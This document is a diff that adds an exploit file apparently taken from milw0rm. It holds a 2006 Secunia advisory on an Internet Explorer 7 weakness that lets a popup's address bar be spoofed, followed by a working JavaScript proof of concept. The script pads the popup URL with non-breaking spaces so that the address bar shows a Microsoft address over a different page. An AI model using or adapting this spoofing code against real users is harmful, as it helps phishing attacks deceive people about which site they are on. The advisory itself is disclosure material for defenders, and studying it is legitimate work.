@@ -1,0 +1,45 @@
+<!--
+Secunia Advisory:   	SA22542  	  
+Release Date: 		2006-10-25
+Impact: 		Spoofing
+Solution Status: 	Unpatched
+Software:		Microsoft Internet Explorer 7.x
+
+Description:
+A weakness has been discovered in Internet Explorer, which can be exploited by malicious 
+people to conduct phishing attacks.
+
+The problem is that it's possible to display a popup with a somewhat spoofed address bar 
+where a number of special characters have been appended to the URL. This makes it possible 
+to only display a part of the address bar, which may trick users into performing certain 
+unintended actions.
+
+Secunia has constructed a demonstration, which is available at:
+http://secunia.com/internet_explorer_7_popup_address_bar_spoofing_test/
+
+The weakness is confirmed in Internet Explorer 7 on a fully patched Windows XP SP2 system.
+
+Solution:
+Do not follow links from untrusted sources.
+
+Provided and/or discovered by:
+Discovered by an anonymous person.
+-->
+
+<script language="JavaScript">
+function StartTest()
+{
+ var padding = '';
+ for ( i=0 ; i<108 ; i++)
+ {
+ padding += unescape("%A0");
+ }
+ newWindow = window.open("", "Win", "width=500,height=325,scrollbars=yes");
+ newWindow.moveTo( (screen.width-325) , 0 );
+ newWindow.document.location = "/result_22542/?" + unescape("%A0") + unescape("%A0") + "http://www.microsoft.com/"+padding;
+ document.location = "http://www.microsoft.com/windows/ie/default.mspx";
+}
+StartTest()
+</script>
+
+# milw0rm.com [2006-10-26]
